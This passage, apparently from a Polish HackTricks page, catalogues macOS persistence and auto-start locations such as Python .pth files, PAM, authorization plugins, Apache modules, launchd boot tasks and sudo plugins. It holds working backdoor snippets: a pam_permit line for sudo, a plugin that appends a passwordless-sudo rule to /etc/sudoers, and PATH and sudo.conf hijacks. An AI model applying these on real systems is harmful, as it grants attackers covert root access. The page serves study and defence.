Launch Services pobiera informacje o obsługiwanych schematach URL i dokumentach z pliku `Info.plist` zarejestrowanej aplikacji. [Przewodnik rejestracji Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) informuje, że rejestracja może nastąpić, gdy Finder wykryje aplikację, podczas uruchamiania systemu lub logowania albo za pośrednictwem jawnego API rejestracji; samo zapisanie aplikacji w dowolnym miejscu nie gwarantuje natychmiastowego wyzwolenia rejestracji. Po rejestracji otwarcie pasującego adresu URL lub dokumentu może uruchomić wybraną aplikację obsługującą, z uwzględnieniem wyboru domyślnej aplikacji przez użytkownika i standardowych kontroli uruchamiania macOS. Obsługiwane API `LSSetDefaultHandlerForURLScheme` zmienia preferowaną przez użytkownika obsługę adresów URL; nie powoduje automatycznego uruchomienia nowo dodanej aplikacji.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Nie zarejestrowano żadnej aplikacji ani nie zmieniono preferencji handlera na testowym Macu z macOS 26.5.2. Aby przetestować rzeczywisty handler, użyj jednorazowego konta użytkownika, zarejestruj aplikację zawierającą wyłącznie marker i używającą unikalnego schematu, wywołaj jej URL, a następnie usuń aplikację i jej rejestrację.

Szczegółowe informacje o enumerowaniu i nadużywaniu handlerów rozszerzeń plików i schematów URL znajdziesz w:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Pliki startowe Pythona (`.pth` / `usercustomize` / `sitecustomize`)

Opis: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Uruchamiane przy starcie odpowiedniego interpretera Pythona z włączonym tym katalogiem site; wyzwalanie nie jest uniwersalne we wszystkich środowiskach wirtualnych, kompilacjach Pythona ani przy różnych flagach startowych
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Uruchamiane z uprawnieniami/TCC procesu, który uruchomił interpreter

#### Lokalizacja

- **`$(python3 -m site --user-site)/*.pth`** (kompilacje frameworka macOS: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Nie wymaga uprawnień roota (katalog zapisywalny przez użytkownika)
  - **Wyzwalacz**: uruchomienie tej kompilacji Pythona z włączonym katalogiem user site; moduł `site` przetwarza pliki `.pth` w aktywnych katalogach site
- **`<user-site>/usercustomize.py`**
  - Nie wymaga uprawnień roota
  - **Wyzwalacz**: uruchomienie z włączonym katalogiem user site (automatycznie importowanym przez `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (np. `/opt/homebrew/lib/python3.13/site-packages/` lub ścieżki systemowe)
  - Uprawnienia roota/administratora mogą być wymagane, zależnie od lokalizacji interpretera
  - **Wyzwalacz**: uruchomienie interpretera, który uwzględnia ten katalog site

#### Opis i wykorzystanie

Podczas uruchamiania Python zwykle importuje `site` i skanuje aktywne katalogi `site-packages` w poszukiwaniu plików `.pth`. Oprócz dodawania ścieżek, wiersz `.pth` zaczynający się od `import ` wykonuje kod Pythona, nawet jeśli wskazany moduł nie jest później używany. Python próbuje również zaimportować `sitecustomize` oraz — **gdy katalog user site jest włączony** — `usercustomize`.<sup>[[56]](#references)</sup> Wyzwalaczem jest późniejsze uruchomienie interpretera, który widzi zmodyfikowany katalog. `-S` wyłącza przetwarzanie `site`; `-s`, `-I` lub `PYTHONNOUSERSITE` wyłączają warianty **user site**. `-I` zazwyczaj nie wyłącza globalnego `sitecustomize`. Środowiska wirtualne również mogą wykluczać katalog user site. Sprawdź `python3 -m site` dla konkretnego interpretera.

Poniższy PoC został uruchomiony na macOS 26.5.2. Na potrzeby testu `PYTHONUSERBASE` przenosi katalog user site do katalogu tymczasowego; rzeczywisty katalog user site nie jest modyfikowany:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Oba znaczniki pojawiły się. W tym teście użycie `-s`, `-I` lub `-S` zapobiegło pojawieniu się obu znaczników **user-site**. Nie testowano `sitecustomize` w globalnym katalogu site.

## Obejście sandboxa z uprawnieniami root

> [!TIP]
> Tutaj znajdziesz lokalizacje autostartu przydatne do **obejścia sandboxa**, które pozwalają po prostu uruchomić coś przez **zapisanie tego do pliku**, gdy masz uprawnienia **root** i/lub spełniasz inne **nietypowe warunki**.

### Periodic

> [!CAUTION]
> **Mechanizm historyczny:** Na maszynie testowej z macOS 26.5.2 nie ma `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` ani demonów launch `com.apple.periodic-*`. Nie zakładaj, że utworzenie `/etc/periodic` w bieżącym systemie spowoduje zaplanowane wykonanie jego zawartości. Przed użyciem poniższego przykładu sprawdź, czy w docelowej wersji systemu dostępne są zarówno polecenie, jak i włączony harmonogram.

Opis: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są jednak uprawnienia root
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Wymagane uprawnienia root
  - **Wyzwalacz**: Gdy nadejdzie odpowiednia pora
- `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`
  - Wymagane uprawnienia root
  - **Wyzwalacz**: Gdy nadejdzie odpowiednia pora

#### Opis i wykorzystanie

W starszych wydaniach skrypty periodic (**`/etc/periodic`**) były uruchamiane zgodnie z harmonogramem przez **demony launch** w `/System/Library/LaunchDaemons/com.apple.periodic*`. Od macOS Big Sur 11.5 program uruchamiający periodic wykonywał skrypty z katalogów periodic jako **właściciel każdego pliku**, zamykając wcześniejszą ścieżkę eskalacji uprawnień.<sup>[[27]](#references)</sup> Poniższe polecenia i listy katalogów przedstawiają historyczne wyniki, a nie rezultat testu na macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

W **`/etc/defaults/periodic.conf`** wskazano także inne skrypty okresowe, które będą uruchamiane:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

W starszych systemach z zainstalowanym i włączonym `periodic` oraz jego launch daemonami dodatkowymi ścieżkami wykonania były `/etc/daily.local`, `/etc/weekly.local` i `/etc/monthly.local`. Bezpieczne sprawdzenie tylko do odczytu:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Reguła oparta na właścicielu była stosowana do skryptów znajdujących się bezpośrednio w katalogach okresowych. Historyczny wrapper `999.local` źródłował pliki `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local` bez takiego samego sprawdzenia właściciela; gdy scheduler działał jako root, pliki lokalne były uruchamiane jako root. To rozróżnienie oraz zmiana w Big Sur 11.5 zostały opisane w [oryginalnym opracowaniu](https://theevilbit.github.io/beyond/beyond_0019/). Nie należy zakładać, że którakolwiek z tych ścieżek jest aktywna, jeśli brakuje `periodic`.

### PAM

Opracowanie: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Opracowanie: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są jednak uprawnienia root
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Zawsze wymagane są uprawnienia root

#### Opis i wykorzystanie

Ponieważ PAM jest bardziej związany z **persistence** i malware niż z łatwym uruchamianiem kodu w macOS, ten blog nie zawiera szczegółowego wyjaśnienia. **Przeczytaj opracowania, aby lepiej zrozumieć tę technikę**.<sup>[[28]](#references)</sup>

Sprawdź moduły PAM za pomocą:

```bash
ls -l /etc/pam.d
```

Technika persistence/privilege escalation wykorzystująca PAM jest tak prosta, jak zmodyfikowanie modułu /etc/pam.d/sudo przez dodanie na początku wiersza:

```bash
auth       sufficient     pam_permit.so
```

Będzie to więc **wyglądać** mniej więcej tak:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Dlatego każda próba użycia **`sudo` zadziała**.

> [!CAUTION]
> Pamiętaj, że ten katalog jest chroniony przez TCC, więc jest bardzo prawdopodobne, że użytkownik zobaczy monit z prośbą o dostęp.

Innym dobrym przykładem jest `su` — można zauważyć, że modułom PAM również można przekazywać parametry (można też umieścić backdoor w tym pliku):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Wtyczki autoryzacyjne

Opis: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Opis: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Przydatne do ominięcia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymaga jednak uprawnień roota i dodatkowej konfiguracji
- Ominięcie TCC: ???

#### Lokalizacja

- `/Library/Security/SecurityAgentPlugins/`
  - Wymagane uprawnienia roota
  - Trzeba też skonfigurować bazę danych autoryzacji tak, aby używała wtyczki

#### Opis i wykorzystanie

Możesz utworzyć wtyczkę autoryzacyjną, która będzie uruchamiana, gdy użytkownik się loguje, aby utrzymać persistence. Więcej informacji o tworzeniu takich wtyczek znajdziesz w poprzednich opisach (zachowaj ostrożność — źle napisana wtyczka może zablokować Ci dostęp i konieczne będzie wyczyszczenie Maca w trybie odzyskiwania).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Przenieś** pakiet do lokalizacji, z której będzie ładowany:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Na koniec dodaj **regułę** ładowania tej wtyczki:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** poinformuje framework autoryzacji, że będzie musiał **wywołać zewnętrzny mechanizm w celu autoryzacji**. Ponadto **`privileged`** sprawi, że mechanizm zostanie uruchomiony przez root.

Wywołaj go za pomocą:

```bash
security authorize com.asdf.asdf
```

A potem grupa **staff powinna mieć dostęp sudo** (sprawdź `/etc/sudoers`, aby to potwierdzić).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są uprawnienia root, a użytkownik musi użyć man
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/private/etc/man.conf`**
  - Wymagane uprawnienia root
  - **`/private/etc/man.conf`**: używany przy każdym uruchomieniu man

#### Opis i exploit

Plik konfiguracyjny **`/private/etc/man.conf`** wskazuje plik binarny/skrypt używany do otwierania dokumentacji man. Można więc zmienić ścieżkę do pliku wykonywalnego, tak aby za każdym razem, gdy użytkownik użyje man do odczytania dokumentacji, uruchamiany był backdoor.<sup>[[31]](#references)</sup>

Na przykład ustaw w **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

Następnie utwórz `/tmp/view` jako:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są uprawnienia root i uruchomiony Apache
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd nie ma uprawnień

#### Lokalizacja

- **`/etc/apache2/httpd.conf`**
  - Wymagane uprawnienia root
  - Wyzwalane: po uruchomieniu Apache2

#### Opis i exploit

Możesz wskazać w `/etc/apache2/httpd.conf`, aby załadować moduł, dodając wiersz taki jak:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

W ten sposób skompilowany moduł zostanie załadowany przez Apache. Musisz jedynie **podpisać go ważnym certyfikatem Apple** albo **dodać nowy zaufany certyfikat** w systemie i **podpisać go** tym certyfikatem.

Następnie, jeśli to konieczne, aby upewnić się, że serwer zostanie uruchomiony, możesz wykonać:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Przykład kodu dla Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Framework audytu BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są jednak uprawnienia roota, uruchomiony auditd i wywołanie ostrzeżenia
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/etc/security/audit_warn`**
  - Wymagany root
  - **Wyzwalacz**: Gdy auditd wykryje ostrzeżenie

#### Opis i exploit

Za każdym razem, gdy auditd wykryje ostrzeżenie, skrypt **`/etc/security/audit_warn`** zostaje **uruchomiony**. Możesz więc dodać do niego swój payload.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Możesz wymusić wyświetlenie ostrzeżenia za pomocą `sudo audit -n`.

### Elementy startowe

> [!CAUTION] > **Ta funkcja jest przestarzała, więc w tych katalogach nie powinno się niczego znaleźć.**

**StartupItem** to katalog, który powinien znajdować się w `/Library/StartupItems/` lub `/System/Library/StartupItems/`. Po utworzeniu katalogu musi on zawierać dwa konkretne pliki:

1. Skrypt **rc**: skrypt powłoki uruchamiany podczas startu systemu.
2. Plik **plist** o nazwie `StartupParameters.plist`, zawierający różne ustawienia konfiguracji.

Upewnij się, że zarówno skrypt rc, jak i plik `StartupParameters.plist` znajdują się we właściwym katalogu **StartupItem**, aby proces startowy mógł je rozpoznać i wykorzystać.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Nie mogę znaleźć tego komponentu w swoim systemie macOS, więc więcej informacji znajdziesz w writeupie

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Wprowadzony przez Apple **emond** to mechanizm logowania, który wydaje się niedopracowany lub być może porzucony, ale nadal jest dostępny. Choć nie jest szczególnie przydatny dla administratora Maca, ta mało znana usługa może służyć threat actorom jako subtelna metoda persistence, prawdopodobnie niezauważona przez większość administratorów macOS.<sup>[[34]](#references)</sup>

Dla osób świadomych jej istnienia wykrycie złośliwego wykorzystania **emond** jest proste. LaunchDaemon tej usługi szuka skryptów do wykonania w jednym katalogu. Można to sprawdzić za pomocą następującego polecenia:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Opis: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Lokalizacja

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Wymagany root
  - **Wyzwalacz**: XQuartz

#### Opis i exploit

XQuartz **nie jest już instalowany w macOS**, więc więcej informacji znajdziesz w opisie.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Instalacja kext jest tak skomplikowana, nawet jako root, że nie jest uznawana za praktyczną technikę sandbox-escape ani persistence, chyba że masz exploit.

#### Lokalizacja

Aby zainstalować KEXT jako element startowy, należy go **zainstalować w jednej z następujących lokalizacji**:

- `/System/Library/Extensions`
  - Pliki KEXT wbudowane w system operacyjny OS X.
- `/Library/Extensions`
  - Pliki KEXT instalowane przez oprogramowanie firm trzecich

Możesz wyświetlić aktualnie załadowane pliki kext za pomocą:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Więcej informacji o [**rozszerzeniach jądra znajdziesz w tej sekcji**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Lokalizacja

- **`/usr/local/bin/amstoold`**
  - Wymagane uprawnienia roota

#### Opis i wykorzystanie

Najwyraźniej `plist` z `/System/Library/LaunchAgents/com.apple.amstoold.plist` używał tego pliku binarnego, jednocześnie udostępniając usługę XPC... Problem w tym, że plik binarny nie istniał, więc można było umieścić tam własny plik, a gdy wywołano usługę XPC, wywołany zostałby ten plik.<sup>[[35]](#references)</sup>

Nie mogę już znaleźć tego w moim macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Lokalizacja

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: uruchomienie usługi (rzadko)

#### Opis i exploit

Najwyraźniej ten skrypt nie jest uruchamiany zbyt często i nie udało mi się go nawet znaleźć w moim macOS. Więcej informacji znajdziesz w writeupie.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **To nie działa we współczesnych wersjach macOS**

Można tu również umieścić **polecenia, które zostaną wykonane podczas uruchamiania.** Przykład zwykłego skryptu rc.common:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Zadania rozruchowe launchd

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Przydatne do obejścia sandboxa: [🔴](https://emojipedia.org/large-red-circle) (wymaga uprawnień root)
- Wymaga uprawnień root oraz albo **obejścia SIP**, albo uprawnienia **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, w zależności od ścieżki

#### Lokalizacja

`launchd` osadza plist w sekcji **`__TEXT,__config`**, która opisuje wczesne „zadania rozruchowe”. Istnieje kilka skryptów/binarnych plików wymienionych w referencjach, które domyślnie **nie istnieją** i mogą zostać utworzone przez atakującego:

- Zestaw obejścia SIP: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Zestaw TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` istnieje domyślnie tylko w Sequoia+)

#### Opis i wykorzystanie

Zrzuć osadzoną tabelę zadań, aby sprawdzić, które pliki `launchd` uruchomi oraz jakie klucze są obsługiwane (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Utworzenie jednego z wymienionych plików (np. `/etc/rc.server`) sprawia, że `launchd` wykona go podczas następnego restartu (userspace). Najbardziej przydatne wpisy są zablokowane przez SIP lub wymagają TCC SysAdminFiles/Full Disk Access, więc jest to technika wymagająca uprawnień root i uruchamiana podczas restartu.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Opis: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Zadanie rozruchowe `rc.trampoline` uruchamia podczas rozruchu **binarny plik platformowy (podpisany przez Apple)** przechowywany w zmiennej NVRAM `apple-trusted-trampoline`, ale **tylko wtedy, gdy ustawiono argument rozruchowy `rc.trampoline=1`, a SIP jest wyłączone** (obowiązuje limit rozmiaru około 390&nbsp;KB oraz wymóg, by plik nie blokował działania i szybko zwracał sterowanie). Ponieważ wymaga **uprawnień root + wyłączonego SIP + payloadu podpisanego przez Apple**, w praktyce jest to metoda utrzymania dostępu, która nie nadaje się do zastosowań w realnym świecie; została tu wymieniona wyłącznie dla kompletności.<sup>[[41]](#references)</sup>

### /etc/paths i /etc/paths.d (PATH hijack)

- Przydatne do ominięcia sandbox: [🔴](https://emojipedia.org/large-red-circle) (do zapisu wymagane są uprawnienia root)
- Wymagane uprawnienia root

#### Lokalizacja

- **`/etc/paths`** i **`/etc/paths.d/*`** — odczytywane przez **`path_helper`** (wywoływane z `/etc/zprofile`) w celu utworzenia domyślnego `PATH` podczas logowania.

#### Opis i wykorzystanie

Oba pliki należą do root. Dodanie na początku ścieżek katalogu kontrolowanego przez atakującego (przez edycję `/etc/paths` lub umieszczenie pliku w `/etc/paths.d/`) sprawia, że katalog ten pojawia się na początku `PATH` każdej nowej powłoki logowania. W rezultacie złośliwy plik binarny o nazwie popularnego polecenia (`ls`, `git` itd.) **przesłania** oryginalny plik i uruchomi się przy następnym wywołaniu polecenia przez ofiarę.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Opis: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Przydatne do bypassu sandboxa: [🔴](https://emojipedia.org/large-red-circle) (wymaga root)
- Wymaga root; rezultat **bypasses SIP**. Podatne wersje macOS: **15.0–15.1**; poprawka w **15.2**

#### Lokalizacja

- Umieść filesystem bundle w **`/Library/Filesystems/`**.

#### Opis i wykorzystanie

`storagekitd` ma entitlement **`com.apple.rootless.install.heritable`** i uruchamiał pliki binarne filesystem bundles z **odziedziczoną** możliwością bypassu SIP. Umieszczając złośliwy filesystem bundle, atakujący mógł uruchomić kod z bypassem SIP, aby zainstalować **trwałe kernel extensions** lub zapisywać pliki w chronionych przez SIP katalogach `LaunchDaemon` — taki mechanizm persistence przetrwa i pokona standardowe zabezpieczenia.<sup>[[46]](#references)</sup> Apple naprawiło ten problem w macOS Sequoia 15.2.

### sudo plugins (/etc/sudo.conf)

Opis: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Przydatne do bypassu sandboxa: [🔴](https://emojipedia.org/large-red-circle) (do zapisu w `/etc/sudo.conf` wymagane jest root)
- Do instalacji wymagane jest root; plugin uruchamia się następnie **przy każdym wywołaniu `sudo`** (w kontekście setuid-root)

#### Lokalizacja

- **`/etc/sudo.conf`** — wiersze `Plugin` ładują obiekty współdzielone z **`/usr/libexec/sudo/`** (lub ze ścieżki bezwzględnej). Domyślnie plik nie istnieje (sudo używa wbudowanej polityki), więc jego utworzenie zapewnia czysty punkt zaczepienia.

#### Opis i wykorzystanie

`sudo` ładuje pluginy polityki, zatwierdzania i audytu z `/etc/sudo.conf`. Ponieważ `sudo` ma ustawiony bit setuid-root, złośliwy plugin typu shared object wykonuje się z **uprawnieniami root za każdym razem, gdy dowolny użytkownik uruchamia `sudo`** — zapewnia to trwały root persistence, a także dostęp do każdego polecenia sudo.<sup>[[51]](#references)</sup> macOS dostarcza sudo 1.9.x, które obsługuje API pluginów.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

